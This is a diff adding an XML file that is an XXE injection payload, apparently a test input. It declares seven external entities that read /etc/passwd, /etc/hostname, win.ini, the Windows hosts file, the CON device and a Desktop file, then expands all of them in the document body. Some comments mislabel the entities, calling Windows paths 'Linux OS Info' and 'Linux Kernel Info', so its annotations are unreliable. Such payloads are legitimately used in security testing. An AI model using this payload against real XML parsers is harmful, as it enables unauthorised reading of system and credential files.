@@ -1,0 +1,19 @@
+<?xml version="1.0" ?>
+<!DOCTYPE root [
+  <!ENTITY test1 SYSTEM "file:C:\Users\User\Desktop\test.txt"> <!-- Linux OS Info -->
+  <!ENTITY test2 SYSTEM "file:C:/Users/User/Desktop/test.txt">   <!-- Linux Kernel Info -->
+  <!ENTITY test3 SYSTEM "file:///etc/hostname">   <!-- Linux Hostname -->
+  <!ENTITY test4 SYSTEM "file:///C:/Windows/System32/win.ini"> <!-- Windows Test -->
+  <!ENTITY test5 SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts"> <!-- Windows Hosts -->
+  <!ENTITY test6 SYSTEM "file:///CON">            <!-- Windows Console -->
+  <!ENTITY test7 SYSTEM "file:///etc/passwd">     <!-- Universal File Check (Linux) -->
+]>
+<root>
+  &test1;
+  &test2;
+  &test3;
+  &test4;
+  &test5;
+  &test6;
+  &test7;
+</root>
